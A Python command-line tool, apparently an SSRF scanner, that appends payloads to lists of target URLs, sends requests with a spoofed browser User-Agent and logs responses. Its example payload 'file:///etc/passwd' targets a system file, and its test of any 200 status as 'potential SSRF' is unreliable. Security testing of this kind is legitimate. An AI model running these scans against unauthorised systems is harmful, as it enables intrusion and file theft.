import requests
import os


def detect_ssrf(target_url, payload, timeout=10):
    """
    Detects SSRF vulnerability by sending a payload to the target URL.
    Returns result string for saving/logging.
    """
    result = ""
    try:
        full_url = f"{target_url}{payload}"

        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0 Safari/537.36'
        }

        response = requests.get(full_url, headers=headers, timeout=timeout)

        if response.status_code == 200:
            result += f"[+] Potential SSRF detected!\n"
            result += f"[+] Target URL: {target_url}\n"
            result += f"[+] Payload: {payload}\n"
            result += f"[+] Response (first 200 chars): {response.text[:200]}...\n\n"
        else:
            result += f"[-] No SSRF for {target_url} with payload {payload}\n"
            result += f"[-] Status code: {response.status_code}\n\n"

    except requests.exceptions.RequestException as e:
        result += f"[-] Error with {target_url} and payload {payload}: {e}\n\n"

    return result


def load_lines_from_file(filename):
    """Reads non-empty lines from a file."""
    try:
        with open(filename, 'r') as file:
            return [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(f"[-] File not found: {filename}")
        return []


def main():
    timeout = 30

    # Ask for URL input type
    input_type = input("Do you want to scan a single URL or a file of URLs? (enter 'url' or 'file'): ").strip().lower()

    if input_type == 'url':
        urls = [input("Enter the target URL (e.g., http://example.com/fetch?url=): ").strip()]
    elif input_type == 'file':
        url_file = input("Enter the filename containing URLs: ").strip()
        urls = load_lines_from_file(url_file)
        if not urls:
            print("[-] No URLs loaded. Exiting.")
            return
    else:
        print("[-] Invalid input type. Exiting.")
        return

    # Ask if user wants to use a single payload
    payload_option = input("Do you want to use a single payload or use the default ssrf_payload.txt file? (enter 'single' or 'default'): ").strip().lower()

    if payload_option == 'single':
        payloads = [input("Enter the payload to test (e.g., file:///etc/passwd): ").strip()]
    elif payload_option == 'default':
        payload_file = "ssrf_payload.txt"
        if not os.path.isfile(payload_file):
            print(f"[-] Default payload file {payload_file} not found in current directory.")
            return
        payloads = load_lines_from_file(payload_file)
        if not payloads:
            print("[-] No payloads loaded. Exiting.")
            return
    else:
        print("[-] Invalid payload option. Exiting.")
        return

    # Ask if user wants to save output
    save_output = input("Do you want to save the output to a file? (yes/no): ").strip().lower()
    if save_output == 'yes':
        output_file = input("Enter the output filename: ").strip()
        if not output_file:
            output_file = "ssrf_scan_results.txt"
        output_results = ""

    # Run SSRF detections
    for url in urls:
        for payload in payloads:
            result = detect_ssrf(url, payload, timeout)
            print(result)
            if save_output == 'yes':
                output_results += result

    # Save if requested
    if save_output == 'yes':
        with open(output_file, 'w') as f:
            f.write(output_results)
        print(f"[+] Results saved to {output_file}")


if __name__ == "__main__":
    main()
